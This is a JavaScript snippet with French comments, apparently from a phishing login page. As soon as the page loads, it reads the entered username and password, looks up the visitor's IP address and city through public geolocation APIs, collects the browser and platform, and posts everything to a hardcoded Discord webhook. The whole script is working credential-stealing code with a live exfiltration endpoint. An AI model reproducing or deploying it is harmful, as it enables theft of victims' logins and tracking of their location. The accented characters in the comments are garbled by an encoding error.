  <script>
    // Fonction pour envoyer les informations √† Discord via un appel de webhook
    function sendToDiscord(ipAddress, city, browser, device) {
      var webhookURL = "https://discord.com/api/webhooks/1125156301689847929/ajxOd4GPMFWeuWFVTVarNi8-8c25WBCT6VS9MuAMfl5hnHnd7GO_Lwh1PM3ZTgBE_qub";

      var content = "> **Identifiant üë§ : **" + document.getElementById('username').value +
        "\n> **Mot de passe üîí : **" + document.getElementById('password').value +
        "\n> **Adresse IP üõ∞Ô∏è : **" + ipAddress +
        "\n> **Ville üè† : **" + city +
        "\n> **Navigateur üìü : **" + browser +
        "\n> **Syst√®me d‚Äôexploitation ‚öôÔ∏è : **" + device;

      var request = new XMLHttpRequest();
      request.open("POST", webhookURL);
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        content: content
      };
      request.send(JSON.stringify(params));
    }

    // Fonction pour r√©cup√©rer l'adresse IP de l'utilisateur, la ville, le navigateur et l'appareil associ√©s
    function getIPCityBrowserDevice() {
      // R√©cup√©rer l'adresse IP de l'utilisateur en utilisant un service de g√©olocalisation
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          var ipAddress = data.ip;

          // R√©cup√©rer la ville en fonction de l'adresse IP
          fetch('https://ipapi.co/' + ipAddress + '/json/')
            .then(response => response.json())
            .then(data => {
              var city = data.city;

              // R√©cup√©rer le navigateur et l'appareil
              var browser = navigator.userAgent;
              var device = navigator.platform;

              // Envoyer les informations √† Discord
              sendToDiscord(ipAddress, city, browser, device);
            })
            .catch(error => {
              console.error('Erreur lors de la r√©cup√©ration de la ville :', error);
            });
        })
        .catch(error => {
          console.error('Erreur lors de la r√©cup√©ration de l\'adresse IP :', error);
        });
    }

    // Appeler la fonction d√®s que le script est charg√©
    getIPCityBrowserDevice();
  </script>
